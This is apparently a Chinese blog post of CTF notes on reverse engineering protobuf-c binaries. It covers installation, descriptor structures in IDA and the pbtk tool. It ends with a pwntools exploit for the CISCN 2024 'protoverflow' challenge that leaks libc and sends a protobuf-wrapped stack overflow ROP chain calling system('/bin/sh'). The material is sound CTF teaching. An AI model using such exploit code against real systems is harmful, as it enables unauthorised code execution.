# Protobuf笔记




<!--more-->

### 安装使用

安装：

```
sudo apt-get update
sudo apt-get install -y protobuf-compiler libprotobuf-dev
sudo apt-get install libprotobuf-c-dev protobuf-c-compiler
```

protoc-c --version用这句来验证是否安装完成

创建一个文件`user.proto`，写入：

```
syntax = "proto3";

message User {
  int32 id = 1;
  string name = 2;
  string email = 3;
}
```

使用以下命令生成C代码：

```
protoc --c_out=. ./user.proto
```

这会在当前目录下生成两个文件：`user.pb-c.h`和`user.pb-c.c`

**`user.pb-c.h`**：头文件，定义了消息类型（如`User`结构体）及其相关的函数。

**`user.pb-c.c`**：源文件，实现了这些函数，包含序列化和反序列化等操作。

```sh
$ tree .          
.
├── user.pb-c.c
├── user.pb-c.h
└── user.proto

0 directories, 3 files
```



在C程序中，需要包含生成的`user.pb-c.h`头文件，这样就可以使用`User`消息类型及其相关的protobuf操作函数。

打个比方

```c
//pwn.c
#include <stdio.h>
#include <stdlib.h>
#include "user.pb-c.h"  // 包含生成的头文件

int main() {
    // 创建一个 User 对象，并初始化
    User user = USER__INIT;  // 生成的宏用于初始化User结构体
    user.id = 123;  // 设置用户ID
    user.name = "John Doe";  // 设置用户名
    user.email = "john.doe@example.com";  // 设置用户邮箱

    // 序列化消息
    size_t serialized_size = user__get_packed_size(&user);  // 获取序列化消息所需的大小
    void *buffer = malloc(serialized_size);  // 分配内存存放序列化数据
    user__pack(&user, buffer);  // 序列化数据到buffer

    printf("Serialized User data to %zu bytes\n", serialized_size);

    // 反序列化消息
    User *new_user = user__unpack(NULL, serialized_size, buffer);  // 从二进制数据反序列化为User对象
    if (new_user == NULL) {
        fprintf(stderr, "Error unpacking User message\n");
        return 1;
    }

    // 输出解包后的User数据
    printf("ID: %d\n", new_user->id);
    printf("Name: %s\n", new_user->name);
    printf("Email: %s\n", new_user->email);

    // 清理内存
    user__free_unpacked(new_user, NULL);  // 释放反序列化后的对象
    free(buffer);  // 释放序列化的缓冲区内存

    return 0;
}
```



然后对其进行编译

```
gcc -o pwn user.pb-c.c pwn.c -lprotobuf-c
```

在这个命令中：

- `user.pb-c.c` 是由 `protoc` 生成的 C 源文件。
- `your_program.c` 是编写的包含主程序的 C 文件。
- `-lprotobuf-c` 指定链接 Protobuf-C 库。

然后就可以看到，我们生成了一个pwn文件



### 基础知识



**Proto2**: 支持 `required` 和 `optional` 修饰符。

**Proto3**: 默认所有字段为 `optional`，不支持 `required`





### 工具逆向

[pbtk](https://github.com/marin-m/pbtk)逆向protobuf的工具

安装

```
sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5
sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client
git clone https://github.com/marin-m/pbtk
cd pbtk
```

使用：

```
# 从二进制文件中提取 .proto 定义
./extractors/from_binary.py /path/to/binary
# 从 JAR/APK 提取
./extractors/jar_extract.py /path/to/app.apk
# 从网页提取 JsProtoUrl
./extractors/web_extract.py https://example.com/proto-endpoint
```

也可以创建软链接使用，注意这里要用绝对路径

```
sudo ln -s /home/ctf/pbtk/extractors/from_binary.py /usr/local/bin/from_binary
```

然后就可以直接这样使用：

```
from_binary ./pwn
```



**注意**

```
$ strings ./pwn | grep -i "\.proto"
```

如果没有就用不了















### 手动逆向

#### message

```protobuf
syntax = "proto2";
 message Message_request{
 required int32 id = 1;
 required string sender = 2;
 required uint32 len = 3;
 required bytes content = 4;
 required int32 actionid = 5;
 }
 message Message_response{
 required int32 id = 1;
 required string receiver = 2;
 required int32 status_code = 3;
 optional string error_message = 4;
 }
```

如果定义了两个`message`，我们去IDA中查看字符串，搜索`message`就会发现：

{{< image src="/img/protobuf/message.png">}}

这里会出现`message`的名字，并知道定义了几个`message`





#### 成员

一般从`rodata`从上往下看，看到的第一个一般都是`string`中的第一个，这里的第一个就是`message_request`。在IDA里：

{{< image src="/img/protobuf/member1.png">}}

往下找还能找到另一个`message`的成员：

{{< image src="/img/protobuf/member2.png">}}

因为上面有id了，这里的id就不会显示





**更准确的查看成员的话**，可以点击旁边的`; DATA XREF: .data.rel.ro:0000000000003CD0↓o`，就能查看引用

这会跳到`.data.rel.ro`段，跳到的这里，一片地址都是同一个`message的成员`









#### 字段描述符

了解完有哪些`message`，每个`message`有哪些成员，接下来就是每个成员的类型

这就要到`.data.rel.ro`去看了

proto文件：

```
syntax = "proto2";

message User {
  required int32 id = 1;
  required string name = 2;
  optional string email = 3;
}

message User2 {
  required int32 id_2 = 1;
  required string name = 2;
  optional string email_2 = 3;
}
```

用IDA打开

这里取`User`的`name`成员来分析

```assembly
.data.rel.ro:0000000000003A68                 dq offset aName         ; "name"
.data.rel.ro:0000000000003A70                 db    2
.data.rel.ro:0000000000003A71                 db    0
.data.rel.ro:0000000000003A72                 db    0
.data.rel.ro:0000000000003A73                 db    0
.data.rel.ro:0000000000003A74                 db    0
.data.rel.ro:0000000000003A75                 db    0
.data.rel.ro:0000000000003A76                 db    0
.data.rel.ro:0000000000003A77                 db    0
.data.rel.ro:0000000000003A78                 db  0Eh
.data.rel.ro:0000000000003A79                 db    0
.data.rel.ro:0000000000003A7A                 db    0
.data.rel.ro:0000000000003A7B                 db    0
.data.rel.ro:0000000000003A7C                 db    0
.data.rel.ro:0000000000003A7D                 db    0
.data.rel.ro:0000000000003A7E                 db    0
.data.rel.ro:0000000000003A7F                 db    0
.data.rel.ro:0000000000003A80                 db  20h
.data.rel.ro:0000000000003A81                 db    0
.data.rel.ro:0000000000003A82                 db    0
.data.rel.ro:0000000000003A83                 db    0
.data.rel.ro:0000000000003A84                 db    0
.data.rel.ro:0000000000003A85                 db    0
.data.rel.ro:0000000000003A86                 db    0
.data.rel.ro:0000000000003A87                 db    0
.data.rel.ro:0000000000003A88                 db    0
.data.rel.ro:0000000000003A89                 db    0
.data.rel.ro:0000000000003A8A                 db    0
.data.rel.ro:0000000000003A8B                 db    0
.data.rel.ro:0000000000003A8C                 db    0
.data.rel.ro:0000000000003A8D                 db    0
.data.rel.ro:0000000000003A8E                 db    0
.data.rel.ro:0000000000003A8F                 db    0
.data.rel.ro:0000000000003A90                 db    0
.data.rel.ro:0000000000003A91                 db    0
.data.rel.ro:0000000000003A92                 db    0
.data.rel.ro:0000000000003A93                 db    0
.data.rel.ro:0000000000003A94                 db    0
.data.rel.ro:0000000000003A95                 db    0
.data.rel.ro:0000000000003A96                 db    0
.data.rel.ro:0000000000003A97                 db    0
.data.rel.ro:0000000000003A98                 db    0
.data.rel.ro:0000000000003A99                 db    0
.data.rel.ro:0000000000003A9A                 db    0
.data.rel.ro:0000000000003A9B                 db    0
.data.rel.ro:0000000000003A9C                 db    0
.data.rel.ro:0000000000003A9D                 db    0
.data.rel.ro:0000000000003A9E                 db    0
.data.rel.ro:0000000000003A9F                 db    0
.data.rel.ro:0000000000003AA0                 db    0
.data.rel.ro:0000000000003AA1                 db    0
.data.rel.ro:0000000000003AA2                 db    0
.data.rel.ro:0000000000003AA3                 db    0
.data.rel.ro:0000000000003AA4                 db    0
.data.rel.ro:0000000000003AA5                 db    0
.data.rel.ro:0000000000003AA6                 db    0
.data.rel.ro:0000000000003AA7                 db    0
.data.rel.ro:0000000000003AA8                 db    0
.data.rel.ro:0000000000003AA9                 db    0
.data.rel.ro:0000000000003AAA                 db    0
.data.rel.ro:0000000000003AAB                 db    0
.data.rel.ro:0000000000003AAC                 db    0
.data.rel.ro:0000000000003AAD                 db    0
.data.rel.ro:0000000000003AAE                 db    0
.data.rel.ro:0000000000003AAF                 db    0
```

这里其实就是对应这个结构体（`proto3`去掉了`default_value`字段）：

```c
struct ProtobufCFieldDescriptor {
    const char *name;            // 0x00 - 指向字段名的字符串
    unsigned int id;             // 0x08 - 字段编号
    unsigned int label;          // 0x0C - required/optional/repeated
    unsigned int type;           // 0x10 - protobuf 类型 (int32=1, string=14 等)
    unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移
    unsigned int offset;         // 0x18 - 在 message struct 里的偏移
    unsigned int _pad0;          // 0x1C - 对齐
    const void *descriptor;      // 0x20 - 嵌套 message/enum 描述符
    const void *default_value;   // 0x28 - 默认值
    unsigned int flags;          // 0x30
    unsigned int reserved;       // 0x34
};
```





导入IDA的话：

```c
typedef void (__fastcall *ProtobufCMessageInit)(void *msg);


struct ProtobufCIntRange {
    int start_value;
    int orig_index;
};

struct ProtobufCFieldDescriptor {
    unsigned int id;
    unsigned int label;
    unsigned int type;
    unsigned int quantifier_offset;
    unsigned int offset;
    void *descriptor;
    void *default_value;
    unsigned int flags;
    unsigned long reserved1;
    unsigned long reserved2;
    unsigned long reserved3;
};
```

- name：字段名。
- id：唯一字段编号。
- label：修饰符，如：required、optional、repeated。
- type：数据类型，如：bool、int32、float、double等。



##### **id**

```
.data.rel.ro:0000000000003A70                 db    2
.data.rel.ro:0000000000003A71                 db    0
.data.rel.ro:0000000000003A72                 db    0
.data.rel.ro:0000000000003A73                 db    0
.data.rel.ro:0000000000003A74                 db    0
.data.rel.ro:0000000000003A75                 db    0
.data.rel.ro:0000000000003A76                 db    0
.data.rel.ro:0000000000003A77                 db    0
```

这里的`2`就是：

```c
  required string name = 2;
```



##### **label**



```c
typedef enum {
    /** A well-formed message must have exactly one of this field. */
    PROTOBUF_C_LABEL_REQUIRED,
 
    /**
     * A well-formed message can have zero or one of this field (but not
     * more than one).
     */
    PROTOBUF_C_LABEL_OPTIONAL,
 
    /**
     * This field can be repeated any number of times (including zero) in a
     * well-formed message. The order of the repeated values will be
     * preserved.
     */
    PROTOBUF_C_LABEL_REPEATED,
 
    /**
     * This field has no label. This is valid only in proto3 and is
     * equivalent to OPTIONAL but no "has" quantifier will be consulted.
     */
    PROTOBUF_C_LABEL_NONE,
} ProtobufCLabel;
```

对应关系

```c
typedef enum {
    PROTOBUF_C_LABEL_REQUIRED = 0,  
    PROTOBUF_C_LABEL_OPTIONAL = 1,  
    PROTOBUF_C_LABEL_REPEATED = 2, 
    PROTOBUF_C_LABEL_NONE = 3 
} ProtobufCLabel;
```





##### **type**

这里的`E`就是对应的类型，也就是`string`

```c
typedef enum {
	PROTOBUF_C_TYPE_INT32,      /**< int32 */
	PROTOBUF_C_TYPE_SINT32,     /**< signed int32 */
	PROTOBUF_C_TYPE_SFIXED32,   /**< signed int32 (4 bytes) */
	PROTOBUF_C_TYPE_INT64,      /**< int64 */
	PROTOBUF_C_TYPE_SINT64,     /**< signed int64 */
	PROTOBUF_C_TYPE_SFIXED64,   /**< signed int64 (8 bytes) */
	PROTOBUF_C_TYPE_UINT32,     /**< unsigned int32 */
	PROTOBUF_C_TYPE_FIXED32,    /**< unsigned int32 (4 bytes) */
	PROTOBUF_C_TYPE_UINT64,     /**< unsigned int64 */
	PROTOBUF_C_TYPE_FIXED64,    /**< unsigned int64 (8 bytes) */
	PROTOBUF_C_TYPE_FLOAT,      /**< float */
	PROTOBUF_C_TYPE_DOUBLE,     /**< double */
	PROTOBUF_C_TYPE_BOOL,       /**< boolean */
	PROTOBUF_C_TYPE_ENUM,       /**< enumerated type */
	PROTOBUF_C_TYPE_STRING,     /**< UTF-8 or ASCII string */
	PROTOBUF_C_TYPE_BYTES,      /**< arbitrary byte sequence */
	PROTOBUF_C_TYPE_MESSAGE,    /**< nested message */
} ProtobufCType;
```

```
PROTOBUF_C_TYPE_INT32      = 0
PROTOBUF_C_TYPE_SINT32     = 1
PROTOBUF_C_TYPE_SFIXED32   = 2
PROTOBUF_C_TYPE_INT64      = 3
PROTOBUF_C_TYPE_SINT64     = 4
PROTOBUF_C_TYPE_SFIXED64   = 5
PROTOBUF_C_TYPE_UINT32     = 6
PROTOBUF_C_TYPE_FIXED32    = 7
PROTOBUF_C_TYPE_UINT64     = 8
PROTOBUF_C_TYPE_FIXED64    = 9
PROTOBUF_C_TYPE_FLOAT      = 10
PROTOBUF_C_TYPE_DOUBLE     = 11
PROTOBUF_C_TYPE_BOOL       = 12
PROTOBUF_C_TYPE_ENUM       = 13
PROTOBUF_C_TYPE_STRING     = 14
PROTOBUF_C_TYPE_BYTES      = 15
PROTOBUF_C_TYPE_MESSAGE    = 16
```



#### 版本



- 在proto3中，删除了字段的默认值，因此ProtobufCFieldDescriptor结构体中没有了default_value字段。

	可以根据逆向后字段的数量来判断题目用的proto版本。

	也就是结构体变成了0x40大小



- 也可以根据特点：

	**Proto2**: 支持 `required` 和 `optional` 修饰符。

	**Proto3**: 默认所有字段为 `optional`，不支持 `required`



#### 偏移问题

有时候我们的`proto`文件：

```protobuf
 syntax = "proto2";
 message Message_request{
    required int32 id = 1;
    required string sender = 2;
    required uint32 len = 3;
    required bytes content = 4;
    required int32 actionid = 5;
 }
 message Message_response{
    required int32 id = 1;
    required string receiver = 2;
    required int32 status_code = 3;
    optional string error_message = 4;
 }

```

但是生成的结构体：

```c
struct  _MessageRequest
{
  ProtobufCMessage base;
  int32_t id;
  char *sender;
  uint32_t len;
  ProtobufCBinaryData content;
  int32_t actionid;
};
```

发现在结构体的头部多了一个ProtobufCMessage类型的变量，查看一下这个类型的定义：

```c
struct ProtobufCMessage {
    /** The descriptor for this message type. */
    const ProtobufCMessageDescriptor    *descriptor;
    /** The number of elements in `unknown_fields`. */
    unsigned                n_unknown_fields;
    /** The fields that weren't recognized by the parser. */
    ProtobufCMessageUnknownField        *unknown_fields;
};
```

它存储这个结构体的一些关键信息，比如Descriptor和未识别的字段。

**ProtobufCMessage的大小为24字节**，因此我们自己定义的字段下标应该是从3开始。

那为什么会多出一个参数呢？

查看编译后的代码发现，bytes类型被替换为了ProtobufCBinaryData类型，看一下它的定义：



```c
struct ProtobufCBinaryData {
    size_t  len;        /**< Number of bytes in the `data` field. */
    uint8_t *data;      /**< Data bytes. */
};
```



它包括8字节的长度和8字节的数据部分，因此IDA识别时会多出一个参数。









### 脚本

写脚本要用到google对protobuf支持的第三方库。如果没安装，运行脚本时候会显示没有google库。

```sh
pip3 install protobuf==3.20.3
```

这里protobuf的版本要用到3.20.x（只有1 2 3），如果没指定版本直接安装了最新版，运行脚本的时候python会提示版本不兼容，protobuf版本过低，要更新protobuf，否则使用3.20.x版本的python库。安装完这个之后，环境就算是配置好了。



逆出proto文件后：

```
protoc --python_out=. message.proto
```

再导入就好了



相关脚本：

```python
import message_pb2

pl=b'a'*0x218+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
message = message_pb2.protoMessage()
message.buffer = pl
message.size = len(pl)

pl = message.SerializeToString()
p.send(pl)
```





参考文章https://hackmd.io/@jsjsj/BkpBdW17kl

https://bbs.kanxue.com/thread-282203.htm

https://xz.aliyun.com/news/15171

https://c-lby.top/2024/protobuf-install/







### 例题

#### CISCN 2024 华中赛区半决赛

> 工具逆向

创建软链接，然后程序就能运行了

```
ln -s /home/ctf/pwn/CISCN/protoverflow/libprotobuf.so.10 /usr/lib/libprotobuf.so.10
```

反编译后发现一行代码:

```c
v5 = google::protobuf::MessageLite::ParseFromArray((google::protobuf::MessageLite *)&unk_209080, s, v6);
```

其实这行代码是在对传入的数据用`protocol buffers`的方式进行解密，所以我们传入的数据就需要用`protocol buffers`加密之后再传入，这样才能正常`parse`

把s中长度v6的内容`parse`后存入`&unk_209080`。解析成功返回true

> 相关的一些东西，不给题目中的是`ParseFromArray`：
>
> - `bool SerializeToString(string* output) const;`: serializes the message and stores the bytes in the given string. Note that the bytes are binary, not text; we only use the `string` class as a convenient container.
> - `bool ParseFromString(const string& data);`: parses a message from the given string.

用pbtk解析：

```protobuf
syntax = "proto2";

message protoMessage {
    optional string name = 1;
    optional string phoneNumber = 2;
    required bytes buffer = 3;
    required uint32 size = 4;
}
```



```
protoc --python_out=. message.proto
```

然后使用这个语句编译成可以导入到python的文件

得到对应文件之后，我们需要导入exp中

```
from pwn import *
import message_pb2
```

漏洞点在`sub_324A`的memcpy栈溢出

exp:

```python
from pwn import *
import message_pb2
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    # pause()

address = './pwn'
p = process(address)

elf = ELF(address)
libc = elf.libc

# ip = ""
# port = 
#p = remote(ip,port)

# leak libc
p.recvuntil(b'Gift: ')
gift = int(p.recv(14), 16)
libc_base = gift - libc.sym['puts']
libc.address = libc_base
success("libc_base = " + hex(libc_base))

# rop
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
ret = next(libc.search(asm('ret'), executable=True))
pop_rdi = next(libc.search(asm('pop rdi; ret'), executable=True))
pop_rsi = next(libc.search(asm('pop rsi; ret'), executable=True))
pop_rdx_r12 = next(libc.search(asm('pop rdx; pop r12; ret'), executable=True))

pl=b'a'*0x218+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
message = message_pb2.protoMessage()
message.buffer = pl
message.size = len(pl)

pl = message.SerializeToString()
p.send(pl)

p.interactive()
```



### 参考文章

https://xz.aliyun.com/news/15171


---

> Author:    
> URL: http://localhost:1313/posts/protobuf/  

